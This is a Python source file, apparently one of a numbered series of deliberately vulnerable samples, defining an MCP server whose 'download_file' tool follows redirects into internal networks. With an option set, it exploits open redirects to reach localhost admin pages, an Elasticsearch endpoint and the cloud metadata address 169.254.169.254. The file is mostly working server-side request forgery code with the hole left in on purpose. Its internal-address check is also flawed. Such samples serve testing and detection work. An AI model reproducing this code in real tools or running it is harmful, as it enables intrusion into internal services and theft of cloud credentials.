"""Example 8: Redirect Following with Open Redirect Exploitation"""
from mcp import FastMCP
import requests
from urllib.parse import urlparse

app = FastMCP("unauthorized-network-access-service-8")

class RedirectFollower:
    """Follows redirects with vulnerability to internal access"""
    
    @staticmethod
    def fetch_with_redirects(url: str, max_redirects: int = 10) -> dict:
        """VULNERABLE: Follow redirects including to internal URLs"""
        redirect_chain = []
        
        try:
            response = requests.get(
                url,
                allow_redirects=True,
                timeout=5
            )
            
            # Track redirect chain
            if response.history:
                for resp in response.history:
                    redirect_chain.append({
                        "url": resp.url,
                        "status": resp.status_code
                    })
            
            redirect_chain.append({
                "url": response.url,
                "status": response.status_code
            })
            
            return {
                "final_url": response.url,
                "redirect_chain": redirect_chain,
                "content_length": len(response.content)
            }
        except Exception as e:
            return {"error": str(e), "redirect_chain": redirect_chain}
    
    @staticmethod
    def exploit_open_redirect(base_url: str, internal_targets: list) -> list:
        """VULNERABLE: Exploit open redirects to access internal services"""
        results = []
        
        for target in internal_targets:
            # Construct URL with redirect parameter
            redirect_url = f"{base_url}?redirect={target}"
            result = RedirectFollower.fetch_with_redirects(redirect_url)
            
            if "error" not in result:
                results.append({
                    "target": target,
                    "accessible": True,
                    "redirect_chain": result["redirect_chain"]
                })
        
        return results
    
    @staticmethod
    def check_redirect_to_internal(url: str) -> bool:
        """Check if URL redirects to internal network"""
        result = RedirectFollower.fetch_with_redirects(url)
        
        if "redirect_chain" in result:
            for redirect in result["redirect_chain"]:
                parsed = urlparse(redirect["url"])
                hostname = parsed.hostname
                
                # Check for internal hostnames
                if hostname in ["localhost", "127.0.0.1"] or \
                   hostname.startswith("192.168.") or \
                   hostname.startswith("10.") or \
                   hostname.startswith("172."):
                    return True
        
        return False

@app.tool()
def download_file(url: str, exploit_redirects: bool = False) -> str:
    """
    Download file from URL with optional redirect exploitation.
    """
    follower = RedirectFollower()
    
    # VULNERABLE: Follow redirects to internal URLs
    result = follower.fetch_with_redirects(url)
    
    # VULNERABLE: Exploit open redirects
    if exploit_redirects:
        internal_targets = [
            "http://localhost:8080/admin",
            "http://127.0.0.1:9200/_cluster/health",
            "http://169.254.169.254/latest/meta-data/"
        ]
        exploits = follower.exploit_open_redirect(url, internal_targets)
        return f"File downloaded. Exploited {len(exploits)} internal targets via redirects."
    
    return f"File downloaded: {len(result.get('redirect_chain', []))} redirects followed"
